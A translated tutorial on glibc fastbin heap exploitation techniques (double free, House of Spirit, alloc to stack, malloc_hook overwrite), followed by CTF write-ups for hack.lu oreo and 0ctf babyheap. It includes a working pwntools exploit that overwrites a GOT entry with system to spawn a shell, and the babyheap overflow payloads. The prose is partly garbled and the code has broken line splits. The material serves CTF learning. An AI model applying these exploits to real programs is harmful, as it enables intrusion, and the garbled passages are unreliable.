# Fastbin Attack
## Introduction
- `fastbin attack` is a type of vulnerability exploitation method, which refers to all vulnerability exploitation methods based on the `fastbin` mechanism. The premise for this type of utilization is:
  - There are vulnerabilities that can control chunk content, such as heap overflow, `use-after-free`, etc.
  - The vulnerability occurs in `chunk` of `fastbin` type

- If subdivided, you can do the following categories:
  - `Fastbin Double Free`
  - `House Of Spirit`
  - `Alloc To Stack`
  - `Arbitrary Alloc`

- Among them, the first two main vulnerabilities focus on using the `free` function to release real chunk or fake chunk`, and then apply for chunk` again for attack. The latter two focus on deliberately modifying the `fd` pointer and directly using `malloc` to apply for a specified location chunk` for attack

## Principle
- The reason why `fastbin attack` exists is that `fastbin` uses a one-way linked list to maintain the released heap blocks, and the `prev_inuse` bit of `next_chunk` managed by `fastbin` will not be cleared even if the `fastbin` is released.
  
- Sample Code

```c
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
	void *chunk1, *chunk2, *chunk3;
	chunk1 = malloc(0x30);
	chunk2 = malloc(0x30);
	chunk3 = malloc(0x30);
	
	free(chunk1);
	free(chunk2);
	free(chunk3);
	
	return 0;
}
```

- Before `free`, `chunk` situation

![](images/1.png#pic_center)

- After `free`, `chunk` situation and `fastbin` situation

![](images/2.png#pic_center)

- It can be seen that the size of the created chunk is 0x30. After release, it will enter `fastbin`. Since `fastbin` manages the released chunk` in the form of a one-way linked list, `chunk` only has a pointer with a `fd` position and points to the prev_size` of the previous chunk`
- There is a white `<-- 0x0` logo in the picture above. There is no `chunk` in front of `chunk1` on this surface.
- It should be noted that the `fd` of the `chunk` of the last released `chunk` in `fastbin` points to the `prev_size` of the previous released `chunk`, and the `main_arena` points to the `prev_size` of the last released `chunk`
- Another thing to note is that the `prev_inuse` flag of `chunk` is `1`. After release, the `prev_inuse` bit of `chunk` is still `1`

## Fastbin Double Free
- `Fastbin Double Free` means that the chunk of `fastbin` can be released multiple times, so it can exist multiple times in the `fastbin` linked list. The consequence is that multiple allocations can remove the same heap block from the `fastbin` linked list, which is equivalent to multiple pointers pointing to the same heap block. Combining the data content of the heap block, it can achieve an effect similar to type confusion (`type confused`)
- `Fastbin Double Free` has two main reasons for successful use:
  - The `pre_inuse` bit of `next_chunk` will not be cleared after the heap block of `fastbin` is released
  - When executing `free`, only the block pointed directly to by `main_arena` is verified, that is, the block at the head of the linked list pointer. The block behind the linked list is not verified.

```c
/* Another simple check: make sure the top of the bin is not the
       record we are going to add (i.e., double free). */
    if (__builtin_expect (old == p, 0))
      {
        errstr = "double free or corruption (fasttop)";
        goto error;
}
```

- Sample Code

```c
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
    void *chunk1, *chunk2, *chunk3;
    chunk1 = malloc(0x20);
    chunk2 = malloc(0x20);

    free(chunk1);
    free(chunk1);
	
    return 0;
}
```

- The program compiled by executing the above code. Since the program releases `chunk1` twice, the program will detect the `SIGABRT` signal during the execution process, and then enters the core dump. The program interrupts. This is because the `_int_free` function detects the `double free` of `fastbin`. This is because when `fastbin` is executing `free`, only the `main_arena` is directly pointed to, that is, the block at the head of the linked list pointer. After `chunk1` is released, the `double free or corruption` will be reported.

![](images/3.png#pic_center)

- If `chunk2` is released after `chunk1` is released, `chunk2` is pointed to by `main_arena`, so it will not be detected when `chunk1` is released again.
- Sample Code

```c
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
    void *chunk1, *chunk2, *chunk3;
    chunk1 = malloc(0x20);
    chunk2 = malloc(0x20);

    free(chunk1);
	  free(chunk2);
    free(chunk1);
	
    return 0;
}
```

- It can be seen that after `chunk1` is released again, it is hung into the `fastbin` link list again. The last white logo proves that there is still a pile block in front of `chunk2` that is hung into the `fastbin` after release.
- At this time, `chunk1` can be regarded as a new block, which means that `chunk1` is released as the latter block of `chunk2`. Then, the value of `chunk1`'s `fd` value is not `0`, but points to `chunk2`. Then, if you can control the content of `chunk1`, you can modify the `fd` pointer to be used to allocate `fastbin` blocks at any address.

![](images/4.png#pic_center)

![](images/5.png#pic_center)

## House Of Spirit
- `House of Spirit` is a technology in `the Malloc Maleficarum`. The core of this technology is to forge `fastbin chunk` at the target location and release it, so as to achieve the purpose of allocating the `chunk` of the specified address.
- To construct the `fastbin fake chunk` and release it, you can put it into the corresponding `fastbin` link list, and some necessary detections need to be bypassed:
  - The `ISMMAP` bit of `fake chunk` cannot be `1`, because when `free` is `mmap`, it will be processed separately
  - The `fake chunk` address needs to be aligned, `MALLOC_ALIGN_MASK`
  - The size of `fake chunk` needs to meet the corresponding `fastbin` requirements, and must also be aligned
  - The size of `next chunk` of `fake chunk` cannot be less than `2 * SIZE_SZ`, and it cannot be greater than `av->system_mem`, i.e. `128kb`

- The `fastbin` link header corresponding to `fake chunk` cannot be the `fake chunk`, that is, it cannot constitute a `double free` situation

- Sample Code

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    fprintf(stderr, "This file demonstrates the house of spirit attack.\n");

    fprintf(stderr, "Calling malloc() once so that it sets up its memory.\n");
    malloc(1);

    fprintf(stderr, "We will now overwrite a pointer to point to a fake 'fastbin' region.\n");
    unsigned long long *a;
    // This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfill allocations (po
inted to from fastbinsY)
    unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));

    fprintf(stderr, "This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n", sizeof(fake_chunks), &fake_chunks[1], &fake_chunks[7]);

    fprintf(stderr, "This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (<= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n");
    fprintf(stderr, "... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n");
    fake_chunks[1] = 0x40; // this is the size

    fprintf(stderr, "The chunk.size of the *next* fake region has to be sane. That is > 2*SIZE_SZ (> 16 on x64) && < av->system_mem (< 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n");
        // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8
    fake_chunks[9] = 0x1234; // nextsize

    fprintf(stderr, "Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &fake_chunks[1]);
    fprintf(stderr, "... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n");
    a = &fake_chunks[2];

    fprintf(stderr, "Freeing the overwritten pointer.\n");
    free(a);

    fprintf(stderr, "Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &fake_chunks[1], &fake_chunks[2]);
    fprintf(stderr, "malloc(0x30): %p\n", malloc(0x30));
}
```

- In the example code, first `malloc` creates a `0x1` chunk`, then defines a pointer of `long long` type `a` and an array of `long long` type `fake_chunks[10]`, followed by `__attribute__ ((aligned (16)))`, where `__attribute__ ((aligned(ALIGNMENT)))` is used to specify the minimum byte alignment number of variables or structures, in units of `byte`, and `ALIGNMENT` is the specified byte alignment operand
- Then put the position with the number subscripted as `1` into the data `0x40`, and put the position with the array subscripted as `9` into the data `0x1234`
- Then print the address with the subscripted array as `1`, and assign the address with the subscripted array as `2` to the pointer `a`
- Then print the address with the subscripted array of `1` and `2` positions, and then reapply a `chunk` of size `0x30`

- Check out the deployment of the `fake_chunk` array first

![](images/6.png#pic_center)

![](images/7.png#pic_center)

- Then write `0x40` and `0x1234` into the locations of `fake_chunks[1]` and `fake_chunks[9]` respectively, and check the deployment status of `fake_chunk` again

![](images/8.png#pic_center)

- You can see that at this time, the position of `fake_chunks[1]` is covered as `0x40`, and the position of `fake_chunk[9]` becomes `0x1234`
- The purpose of changing these two positions is to forge a fake `chunk`, `0x7ffffffffde40` position as the `prev_size` of `chunk`, `0x40` of `chunk` position as the `size` bit of `chunk`, `0x7ffffffffde50`-`0x7ffffffffde78` is used as the `data` area of ​​`fake_chunks[9]` position `0x1234`, as the `next_chunk` size` bit

- Next, the assignment of pointer `a` will be completed, and the address of `fake_chunk[2]` will be assigned to pointer `a`. The `fake_chunk[2]` here actually corresponds to the `data` pointer of the fake block. After printing, look at the address of the `a` pointer

![](images/9.png#pic_center)

- Then `free` drop the fake chunk` and check the `bin`

![](images/10.png#pic_center)

- At this time, although `fake_chunk` was not applied by `malloc`, it meets the conditions for putting it into the corresponding `fastbin` link list when it is released, so it can
`free` and hang into the `fastbin` link list
- Then apply for a `0x30` `chunk`, you can see that its address is ``, check the `fastbin`, you can see that `fake_chunk` is re-enabled after this application

![](images/11.png#pic_center)

- Using the `House Of Spirit` technology, if you can forge chunk` in any writable location, and deploy the `got` address of the `free` function in advance, then obtain the `system` function and `/bin/sh` string address through leaks. Then use `House Of Spirit` to restart the `chunk`, and then modify the real address of the `free` function in the `chunk` to the address of the `system` function. In this way, when releasing a `chunk`, you do not enter the `id` of `chunk`, but enter `/bin/sh` to getshell`

## Alloc To Stack

- `Alloc To Stack` is similar to `Fastbin Double Free` and `House Of Spirit` techniques. The essence of these three techniques lies in the characteristics of the `fastbin` linked list. The current `fd` pointer of `chunk` points to the next `chunk`
- The key point of this technology `Alloc To Stack` is to hijack the `fd` pointer of `chunk` in the `fastbin` link list and point the `fd` pointer to the stack you want to allocate, thereby controlling some key data in the stack, such as return address, etc.

- Sample Code

```c
#include <stdio.h>
#include <stdlib.h>

typedef struct _chunk
{
	long long pre_size;
	long long size;
	long long fd;
	long long bk;
} CHUNK, *PCHUNK;

int main()
{
	CHUNK stack_chunk;
	
	long long *chunk1;
	long long *chunk2;
	
	stack_chunk.size = 0x21;
	chunk1 = malloc(0x10);
	
	free(chunk1);
	
	*(long long *)chunk1 = &stack_chunk;
	malloc(0x10);
	chunk2
= malloc(0x10);
	
	return 0;
}
```

- In the example code, `fake_chunk` is placed on the stack, and hijacked the `fd` value of `chunk` in the `fastbin` link list. By pointing the `fd` value to `stack_chunk`, we can achieve the allocation of `fastbin chunk` in the stack.

- Check out the heap deployment before `free`

![](images/12.png#pic_center)

- Then check the heap deployment after `free` and the situation in `bin`

![](images/13.png#pic_center)

- Since `chunk1` is not released in front of `chunk1`, the `fd` position of `chunk` is empty and does not point to any `chunk`
- However, after releasing `chunk1`, its `malloc` pointer is not empty, which causes the `chunk1` to be remodified. Next, change the value of `fd` in `chunk1` to the `stack_chunk` structure pointer
- As you can see in `fastbin`, `stack_chunk` is a block released in front of `chunk1`, and `stack_chunk` is actually a fake `chunk` deployed on the stack.

![](images/14.png#pic_center)

- Therefore, the heap manager will consider that there are two released heap blocks of `0x20` size in the `0x20` unidirectional linked list of `fastbin`. At this time, if two `0x20` size pile blocks are applied in succession, the fake `stack_chunk` on the stack will be enabled as a `chunk`

![](images/15.png#pic_center)

![](images/16.png#pic_center)

- Through the `Alloc To Stack` technology, `fastbin chunk` can be allocated to the stack, thereby controlling key data such as return address. To achieve this, you need to hijack the `fd` field of `chunk` in `fastbin` and point it to the stack. Of course, there is a `size` value that meets the conditions on the stack.

## Arbitrary Alloc

- `Arbitrary Alloc` and `Alloc To Stack` are basically exactly the same. The only difference is that the allocation target is no longer in the stack. As long as there is a legal `size` field that meets the target address (it is not damaging whether this `size` field is constructed or exists naturally), you can allocate `chunk` to any writable memory, such as `bss`, `heap`, `data`, `stack`, etc.

- Sample Code

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
	long long *chunk1;
	long long *chunk2;
	
	chunk1 = malloc(0x60);
	
	free(chunk1);
	
	*(long long *)chunk1 = 0x7ffff7dd1aed;
	malloc(0x10);
	chunk2 = malloc(0x60);
	
	return 0;
}
```

`0x7ffff7dd1b20`

- The `0x7ffff7dd1aed` in the sample code is the `fake chunk` with `malloc_hook`. The search method is as follows
- First check the current address of `main_arena`: `print (void*)&main_arena`

![](images/17.png#pic_center)

- Print out the address of `main_arena` is `0x7ffff7dd1b20`, and the offset of `malloc_hook` relative to `main_arena` is `0x10`, this is fixed, you can see that `malloc_hook` is `0x7ffff7dd1b10`

![](images/18.png#pic_center)

- Next, use the command `find_fake_fast 0x7ffff7dd1b10 0x70` to find the `fake chunk` that meets the requirements. You can see that the address of the `fake chunk` that meets the requirements is `0x7ffff7dd1aed`

![](images/19.png#pic_center)

- The subsequent operation steps are the same as `Alloc To Stack`. In the next two `malloc`, the first time will the original release of `fastbin` will be restarted. The second time `malloc` will enable `fake_chunk` with `malloc_hook` as normal `chunk`, and assign the `malloc` pointer to `chunk2`
- Because the `malloc_hook` address exists in the `chunk2` content part, if you write maliciously on `chunk2`, you will also write it to `malloc_hook` to control the `hook` process

## CTF Example Questions
### 2014 hack.lu oreo
#### Static analysis

- The program has a total of `6` functions
  - `Add new rifle`
  - `Show added rifles`
  - `Order selected rifles`
  - `Leave a Message with your Order`
  - `Show current stats`
  - `Exit`

![](images/20.png#pic_center)

- In the `addRifle` function, first assign the value of the global variable `dword_804A288` to `v1`, then apply for a `0x38` size `chunk`, and store the `malloc` pointer of the `chunk` in the global variable `dword_804A288`
- Then we will judge whether the chunk` is allocated successfully. If successful, the value in the variable `v1` will be stored at the position of `malloc pointer +13`. Then, the gun name will be received through the `fgets` function and stored at the position of `malloc pointer +25`. The maximum input character is `56` bytes
- Then the `sub_80485EC` function will be called, which mainly plays a length check
- Then receive the forced description through the `fgets` function and store it in the start position of the `malloc pointer`, and the maximum input character is `56` bytes
- Then continue to call the `sub_80485EC` function, the global variable `dword_804A2A4` will increase automatically

```c
unsigned int addRifle()
{
  char *v1; // [esp+18h] [ebp-10h]
  unsigned int v2; // [esp+1Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  v1 = dword_804A288;
  dword_804A288 = (char *)malloc(0x38u);
  if ( dword_804A288 )
  {
    *((_DWORD *)dword_804A288 + 13) = v1;
    printf("Rifle name: ");
    fgets(dword_804A288 + 25, 56, stdin);
    sub_80485EC(dword_804A288 + 25);
    printf("Rifle description: ");
    fgets(dword_804A288, 56, stdin);
    sub_80485EC(dword_804A288);
    ++dword_804A2A4;
  }
  else
  {
    puts("Something terrible happened!");
  }
  return __readgsdword(0x14u) ^ v2;
}
```

```c
unsigned int __cdecl sub_80485EC(const char *a1)
{
  size_t v1; // edx
  const char *v3; // [esp+28h] [ebp-10h]
  unsigned int v4; // [esp+2Ch] [ebp-Ch]

  v4 = __readgsdword(0x14u);
  v1 = strlen(a1) - 1;
  v3 = &a1[v1];
  if ( &a1[v1] >= a1 && *v3 == 10 )
    *v3 = 0;
  return __readgsdword(0x14u) ^ v4;
}
```

- The structure diagram of `chunk` applied in the `addRifle` function is shown in the following figure, and there are several points to pay attention to
  - The global variable `dowrd_804A288` stores the applied `malloc` pointer, but this `malloc` pointer is not placed in any structure. Instead, every time a `chunk` is applied, the `malloc` pointer of the previous application will be overwritten as a new `malloc` pointer, so there will only be a `chunk` pointer of the `chunk` in the global variable `dowrd_804A288`, that is, the `malloc` pointer of the last application
  - The `malloc` address of the previous `chunk` ending at `rifle_name` is used to connect multiple `chunk`s requested.
  - The global variable `dword_804A2A4` has a counting function, which records the number of `chunk` that has been applied
  - There is heap overflow in this function. Since the `fgets` function can receive up to 56` bytes of input, this causes the input string to burst out the length limit of the member variable, causing the data to overflow to other member variable positions or other `chunk`

![](images/21.png#pic_center)

- in `showRif
In the le` function, traverse `rifle_name` and `rifle_description` through loop, start from the last applied `chunk`, and perform `(char *)*((_DWORD *)i + 13)` operation after each loop. Here it will point to the `malloc` pointer to the previous `chunk` at the end

```c
unsigned int showRifle()
{
  char *i; // [esp+14h] [ebp-14h]
  unsigned int v2; // [esp+1Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  printf("Rifle to be ordered:\n%s\n", "===================================");
  for ( i = dword_804A288; i; i = (char *)*((_DWORD *)i + 13) )
  {
    printf("Name: %s\n", i + 25);
    printf("Description: %s\n", i);
    puts("===================================");
  }
  return __readgsdword(0x14u) ^ v2;
}
```

- In the `orderRifle` function, first assign the value of the global variable `dword_804A288` to `v1`, and then determine whether the `chunk` is applied for by the global variable `dword_804A2A4`. If it exists, then assign the value of the variable `v1` to the variable `ptr`, then assign the value of the `malloc point` to the variable `v1`, and release the `malloc` pointer in the variable `ptr`
- Then empty the `malloc` pointer in the global variable `dword_804A288` and add the global variable `dword_804A2A0`
- Loop until all created `chunk` is released and the loop is jumped out
- But it should be noted that the variable `ptr` will be reassigned by the variable `v1` every time it is released. When the variable `ptr` is not empty when it is released for the last time.

```c
unsigned int orderRifle()
{
  char *v1; // [esp+14h] [ebp-14h]
  char *ptr; // [esp+18h] [ebp-10h]
  unsigned int v3; // [esp+1Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  v1 = dword_804A288;
  if ( dword_804A2A4 )
  {
    While ( v1 )
    {
      ptr = v1;
      v1 = (char *)*((_DWORD *)v1 + 13);
      free(ptr);
    }
    dword_804A288 = 0;
    ++dword_804A2A0;
    puts("Okay order submitted!");
  }
  else
  {
    puts("No rifles to be ordered!");
  }
  return __readgsdword(0x14u) ^ v3;
}
```

- In the `levelMessage` function, it is used to store messages to orders

```c
unsigned int leaveMessage()
{
  unsigned int v1; // [esp+1Ch] [ebp-Ch]

  v1 = __readgsdword(0x14u);
  printf("Enter any notice you'd like to submit with your order: ");
  fgets(dword_804A2A8, 128, stdin);
  sub_80485EC(dword_804A2A8);
  return __readgsdword(0x14u) ^ v1;
}
```

- In the `show` function, it is used to show how many guns are currently added, how many orders are ordered, and what information is left behind

```c
void __noreturn show()
{
  puts("======== Status =================);
  printf("New: %u times\n", dword_804A2A4);
  printf("Orders: %u times\n", dword_804A2A0);
  if ( *dword_804A2A8 )
    printf("Order Message: %s\n", dword_804A2A8);
  puts("======================");
}
```

#### Dynamic Analysis
- Due to heap overflow, you can use `rifle_name` overflow to overwrite the `get` address of a function. Then when calling the `showRifle` function, the real address of the function will be printed out, and then `sys_addr` and `bin_sh_addr` are searched through `libcSearch`.

![](images/22.png#pic_center)

- After getting `sys_addr` and `bin_sh_addr`, fake `chunk` to replace the function in `got` of a function with the address of the `system` function. Since every `chunk` is created, the address of the global variable `dword_804A2A4` will increase automatically, so it can be used as the `chunk``size`
- As shown in the figure below, `0x804A2A4` can be used as the size of `fake_chunk`, `0x804A2A0` can be used as the prev_size of `fake_chunk`, and `0x804A2A8` can be used as the `malloc` address of `fake_chunk` data. Therefore, by applying for `0x40` `chunk`, you can forge a `fake_chunk`, and you must ensure that the `0x3f` `chunk` pointer ending with `0x804A2A8`

![](images/23.png#pic_center)

- After forging `chunk`, you need to release `chunk` the next release of `chunk` for checking for forging `chunk`
  - The size of the fake chunk is `0x40`, so the spaces from `0x804A2A8` to `0x804A2D8` in total `0x30` should belong to the fake chunk`, so the prev_size address of the latter `chunk` of the fake_chunk` should be `0x804a2e0`
  - If you want to apply for re-enablement immediately after releasing `fake_chunk`, then the size of the next chunk should be greater than the maximum range of `fastbin` 0x40` (`32`bit program). In this way, after releasing `fake_chunk` can be directly hung before `main_arena` in `fastbin`. Then here you can set the `size` of the next chunk to `0x100`
  - Since the size of the latter chunk exceeds the maximum value of `fastbin`, then the prev_size` of the latter chunk needs to identify the size of the previous release block `fake_chunk`, and the `prev_inuse` bit must be marked `0`, that is, `0x40`

![](images/24.png#pic_center)

- Since the `malloc` address location of the forged `fake_chunk` happens to be the pointer to the message, in the message function, the input string will store the address pointed to by the global variable `dword_804A2A8`. The address of the global variable `dword_804A2A8` is `0x804A2A8`, and the message pointer points to `0x804a2c0`, that is, the input string is stored starting from `0x804a2c0`
- So in this way, if you remove the 24 bytes from `0x804A2A8` to `0x804A2B8`, you need to free up the `0x20 bytes of space for `fake_chunk`
- After deploying `chunk`, call the submit order function to release the forged `fake_chunk`

#### EXP

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')

r = process('/home/h3rmesk1t/oreo')
elf = ELF('/home/h3rmesk1t/oreo')
libc = ELF('/home/h3rmesk1t/libc.so.6')

def add_rifle(name, description):
    r.sendline(b'1')
    r.sendline(name)
    r.sendline(description)

def show_rifle():
    r.sendline(b'2')
    r.recvuntil(b'=====================================================\n')

def order_rifle():
    r.sendline(b'3')

def level_message(message):
    r.sendline(b'4')
    r.sendline(message)


name = b'a' * 27 + p32(elf.got['puts'])
des
script = b'b' * 25
add_rifle(name, description)
show_rifle()

r.recvuntil(b'Description: ')
r.recvuntil(b'Description: ')

puts_addr = u32(r.recvuntil('\n', drop=True)[:4])
log.success('puts address: ' + hex(puts_addr))
libc_base = puts_addr - libc.symbols['puts']
sys_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

num = 1
while num < 0x3f:
    add_rifle(b'a' * 27 + p32(0), b'b' * 25)
    num += 1
payload = b'a' * 27 + p32(0x804A2A8)
add_rifle(payload, b'b' * 25)

payload = b'\x00' * 0x20 + p32(40) + p32(0x100)
payload = payload.ljust(52, b'a')
payload += p32(0)
payload = payload.ljust(128, b'a')
level_message(payload)
order_rifle()

payload = p32(elf.got['strlen']).ljust(20, b'a')
add_rifle(b'a' * 20, payload)
# gdb.attach(r)
log.success('system addr: ' + hex(sys_addr))
# gdb.attach(r)
level_message(p32(sys_addr) + b';/bin/sh\x00')

r.interactive()
```

### 2017 0ctf babyheap
#### Static analysis

- The program is a heap allocator, which contains the following five functions:
  - `Allocate`
  - `Fill`
  - `Free`
  - `Dump`
  - `Exit`

- After analyzing the program, it was found that the vulnerability point is in the `Fill` function. The function that reads the content directly reads the content of the specified length and does not set the end of the string. Moreover, this specified length is specified, not the length specified when the `chunk` allocation was previously, so there is a situation of arbitrary heap overflow here

```c
__int64 __fastcall fill(__int64 a1)
{
  __int64 result; // rax
  int v2; // [rsp+18h] [rbp-8h]
  int v3; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  result = sub_138C();
  v2 = result;
  if ( (unsigned int)result <= 0xF )
  {
    result = *(unsigned int *)(24LL * (int)result + a1);
    if ( (_DWORD)result == 1 )
    {
      printf("Size: ");
      result = sub_138C();
      v3 = result;
      if ( (int)result > 0 )
      {
        printf("Content: ");
        return sub_11B2(*(_QWORD *)(24LL * v2 + a1 + 16), v3);
      }
    }
  }
  return result;
}
```

#### Dynamic Analysis
- It is certain that the main vulnerability is arbitrary length heap overflow, and since almost all protections of the program are enabled, there must be some leakage to control the process of the program
- Here we use the `main_arena` address as the key address, and other addresses are offset and obtained through `main_arena` as the base address
- In case, if you want to get the `main_arena` address, you will consider starting from `unsorted bin`, because the first one not adjacent to `top_chunk` is released into `unsorted bin`, the `fd` position of the `chunk` points to `unsorted bin address`, and the offset between `unsorted bin address` and `main_arena` is fixed
- Therefore, after building the `unsorted bin chunk`, you only need to use the `dump` function in the program to print the `unsorted bin chunk` to leak the `unsorted bin address`

- First create `4 `0x20` size `chunk`, and then create `0x90` size `chunk`, the purpose of setting this is to release `chunk3` and `chunk2` into `fastbin`, so that the situation in `fastbin` will become `chunk2_fd` --> `chunk3_fd` --> `NULL`
- After deployment in `fastbin`, you can overflow chunk1` through the `fill` function, overwrite the address of chunk2_fd` to make it point to chunk5`. Because the `chunk5` size is `0x90`, the `fd` pointer will point to `unsorted bin addr` after `chunk5` is released, so that `chunk5` will be pulled into the water because `chunk2_fd` is overflowed and will be pulled into the water.

- The starting address of the memory area created by `mmap` is almost randomly generated. Here we need to first check the location of the structure and obtain it through `vmmap`

![](images/25.png#pic_center)

![](images/26.png#pic_center)

- According to the previous idea, release `chunk3` first, then release `chunk2`

![](images/27.png#pic_center)

- Then overwrite `chunk2_fd` through `chunk1`. After overwriting, `chunk2` in `fastbin` --> `chunk5`

```python
payload_chunk1_overflow = b'a' * 0x10 + p64(0) + p64(0x21) + p64(0x80)
```

![](images/28.png#pic_center)

- Then if you want to operate on `chunk5`, you need to restart the `chunk5` pointed to by chunk2` in `fastbin`. However, since the `chunk5` size is `0x90` instead of `0x20`, even if the `chunk` `0x20` single necklace list of `fastbin`, it cannot be enabled.
- So you also need to write overflow data to `chunk4` to overwrite the size of `chunk5` to `0x20` to re-enable `chunk5`

```python
payload_chunk4_overflow = b'a' * 0x10 + p64(0) + p64(0x21)
```

![](images/29.png#pic_center)

- Then you only need to reapply two chunks of `0x20` size. The first application for `0x20` will re-enable `chunk2` at the end of the single-necklist in `fastbin`. The second application for `0x20` will enable `0x20` `1st application for `0x20` `1st application for `fastbin` will enable `chunk5` in `fastbin`.



- Then operate on chunk5 with id`2`, which is equivalent to operating on chunk5 with id`4`
- The reason why `chunk5`'s `size` was defined as `0x90` was to enable `unsortbin` to point to `unsortbin_addr` when releasing `chunk5`'s `fd` points to `unsortbin_addr`, so you need to overflow `chunk4` and change the `size` of `chunk5` back to `0x90`
- Then apply for a `0x90` size `chunk` and release `chunk5`
- Since the `chunk` chunk` pointer of chunk5` has been deployed in the structure with `id`2`, then you only need to call the `dump` function in the program to print the chunk` content with `id`2`, and you can print out the `unsorted bin addr` (`fd`) in chunk5`